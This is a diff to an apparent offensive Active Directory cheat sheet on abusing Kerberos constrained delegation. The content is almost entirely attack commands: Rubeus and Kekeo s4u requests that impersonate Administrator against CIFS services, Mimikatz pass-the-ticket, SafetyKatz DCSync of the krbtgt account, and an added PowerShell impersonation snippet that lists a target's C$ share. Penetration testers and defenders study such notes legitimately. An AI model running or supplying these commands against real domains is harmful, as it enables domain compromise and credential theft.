@@ -2005,7 +2005,7 @@ Using Kekeo
  
 Using Rubeus
 - Request a TGT and TGS in a single command
-  - `Rubeus.exe s4u /user:<websvc_user> /aes256:<aes256_hash> /impersonateuser:<target_user> /msdsspn:<SPN> /ptt`
+  - `Rubeus.exe s4u /user:<user> /aes256:<aes256_hash> /impersonateuser:Administrator /msdsspn:CIFS/<target> /ptt`
   - `ls \\<target_hostname>\c$`
  
 -> Another issue with Kerberos is that delegation takes place not only for the designated service but also for any service operating under the same account. Moreover, there's no validation performed for the specified SPN.
@@ -2013,19 +2013,29 @@ Using Rubeus
 Abusing with Kekeo
 - Plaintext password or NTLM hash required
 - Request a TGT using asktgt
-  - `tgt::ask /user:<target_user>$ /domain:<domain_name> /rc4:<rc4_hash>`
+  - `tgt::ask /user:<target_user> /domain:<domain_name> /rc4:<rc4_hash>`
 - Using s4u (no SNAME validation):
-  - `tgs::s4u /tgt:<TGT_path> /user:<target_user>@<domain> /service:<service_SPN>`
+  - `tgs::s4u /tgt:<TGT_path> /user:Administrator@<domain> /service:cifs/<target>`
 - Using mimikatz
   - `Invoke-Mimikatz -Command '"kerberos::ptt <TGS_Ticket.kirbi>"'`
   - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<krbtgt_user>"'`
 
 Abusing with Rubeus
 - Request a TGT and TGS in a single command
-  - `Rubeus.exe s4u /user:<target_user> /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:<target_SPN> /altservice:ldap /ptt`
+  - `.\Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/<target>" /ptt`
 
 After injection, we can DCSync:
 `C:\path\to\SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"`
+
+Another way to do it, if you have AllowedDelegateTo for the machine
+```
+[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
+$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
+$idToImpersonate.Impersonate()
+[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
+
+ls \\<target>\C$
+```
 
 ### Resource-based Constrained Delegation
 
